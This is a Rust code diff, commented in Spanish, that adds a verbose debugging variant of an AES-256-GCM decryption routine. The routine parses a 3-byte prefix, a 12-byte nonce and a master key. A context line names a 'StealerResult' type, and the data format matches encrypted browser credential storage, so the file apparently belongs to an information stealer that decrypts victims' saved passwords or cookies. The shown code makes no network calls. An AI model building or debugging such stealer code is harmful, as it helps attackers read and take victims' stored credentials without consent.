@@ -248,8 +248,66 @@ pub fn decrypt_aes_gcm_bytes(encrypted_data: &[u8], master_key: &[u8]) -> Option
     let cipher = Aes256Gcm::new_from_slice(master_key).ok()?;
     let nonce = Nonce::clone_from_slice(nonce_bytes);
     
-    // Desencriptar
+    // Desencriptar - si falla, retornar None pero sin logging aquí
     cipher.decrypt(&nonce, ciphertext_with_tag).ok()
+}
+
+/// Versión con logging para debug
+pub fn decrypt_aes_gcm_bytes_debug(encrypted_data: &[u8], master_key: &[u8]) -> (Option<Vec<u8>>, String) {
+    let mut log = String::new();
+    
+    log.push_str(&format!("        📊 Total bytes: {}\n", encrypted_data.len()));
+    log.push_str(&format!("        📊 Master key length: {}\n", master_key.len()));
+    
+    if encrypted_data.len() < 3 {
+        log.push_str("        ❌ Datos muy cortos (< 3 bytes)\n");
+        return (None, log);
+    }
+    
+    let prefix = &encrypted_data[0..3];
+    log.push_str(&format!("        📊 Prefix: {:02X} {:02X} {:02X} ({})\n", 
+        prefix[0], prefix[1], prefix[2], 
+        String::from_utf8_lossy(prefix)));
+    
+    if encrypted_data.len() < 3 + 12 + 16 {
+        log.push_str(&format!("        ❌ Datos muy cortos para AES-GCM (mínimo 31 bytes, tiene {})\n", encrypted_data.len()));
+        return (None, log);
+    }
+    
+    // Extraer componentes
+    let nonce_bytes = &encrypted_data[3..15];
+    let ciphertext_with_tag = &encrypted_data[15..];
+    
+    log.push_str(&format!("        📊 Nonce length: {} bytes\n", nonce_bytes.len()));
+    log.push_str(&format!("        📊 Ciphertext+Tag length: {} bytes\n", ciphertext_with_tag.len()));
+    log.push_str(&format!("        📊 Expected plaintext: {} bytes\n", ciphertext_with_tag.len() - 16));
+    
+    // Crear cipher
+    let cipher = match Aes256Gcm::new_from_slice(master_key) {
+        Ok(c) => {
+            log.push_str("        ✅ Cipher creado correctamente\n");
+            c
+        },
+        Err(e) => {
+            log.push_str(&format!("        ❌ Error creando cipher: {:?}\n", e));
+            return (None, log);
+        }
+    };
+    
+    let nonce = Nonce::clone_from_slice(nonce_bytes);
+    
+    // Desencriptar
+    match cipher.decrypt(&nonce, ciphertext_with_tag) {
+        Ok(plaintext) => {
+            log.push_str(&format!("        ✅ Desencriptación exitosa: {} bytes\n", plaintext.len()));
+            (Some(plaintext), log)
+        },
+        Err(e) => {
+            log.push_str(&format!("        ❌ Error en decrypt: {:?}\n", e));
+            log.push_str("        💡 Posible causa: Master key incorrecta o formato diferente\n");
+            (None, log)
+        }
+    }
 }
 
 fn decrypt_aes_gcm(encrypted_data: &[u8], master_key: &[u8]) -> StealerResult<String> {
